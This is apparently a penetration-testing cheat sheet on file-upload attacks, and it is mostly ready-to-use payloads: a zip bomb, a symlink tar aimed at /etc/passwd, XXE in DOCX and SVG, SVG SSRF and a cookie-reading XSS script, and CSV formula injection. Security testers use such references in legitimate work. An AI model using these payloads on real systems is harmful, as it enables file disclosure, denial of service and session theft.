# File Upload - Archive-Based Attacks

## Zip Slip (Path Traversal via Archive Extraction)
See `path-traversal.md` for payload construction. This file focuses on archive-specific attack vectors beyond path traversal.

## Zip Bomb (DoS via Decompression)
```bash
# Create highly compressible file
dd if=/dev/zero bs=1M count=1000 | gzip -9 > bomb.gz
# 1GB of zeros compresses to a few MB, but decompresses back to 1GB
```

### Nested Zip Bomb (extreme compression ratio)
```bash
# 42.zip style - nested zips of zips, exponential expansion
# Each layer contains multiple copies of the next layer
```

## Archive Symlink Attack
```bash
# Create a symlink inside a tar archive pointing to sensitive location
ln -s /etc/passwd symlink_file
tar -cvf evil.tar symlink_file
# If app reads "symlink_file" content after extraction, may leak /etc/passwd
```

## XXE via Office Documents (DOCX/XLSX are ZIP containers with XML)
```bash
# DOCX = ZIP containing XML files
unzip document.docx -d extracted/
# Edit extracted/word/document.xml to add XXE payload:
```
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```
```bash
cd extracted && zip -r ../evil.docx .
```

## SVG-Based Attacks (XML-based image format)

### XXE in SVG
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### SSRF in SVG (via external image reference)
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://internal-service:8080/admin" />
</svg>
```

### Stored XSS via SVG
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

## Uploading Malicious PDF (JS execution in some PDF viewers)
```
# PDF supports embedded JavaScript
# Craft PDF with /OpenAction /JS to trigger code in vulnerable readers
```

## CSV Injection
```
=cmd|'/C calc'!A0
=SYSTEM("calc")
=cmd /C calc
```

## Testing Checklist
```
1. If SVG uploads accepted and rendered inline (not just as <img>), test XSS/XXE
2. If DOCX/XLSX/PPTX processed server-side (e.g. for preview generation), test XXE via embedded XML
3. If ZIP/TAR uploads are extracted, test Zip Slip and symlink attacks
4. Check for zip bomb DoS if no size/ratio limits enforced on decompression
5. Confirm library used for extraction (7zip, unzip, Python zipfile) and check known CVEs
```
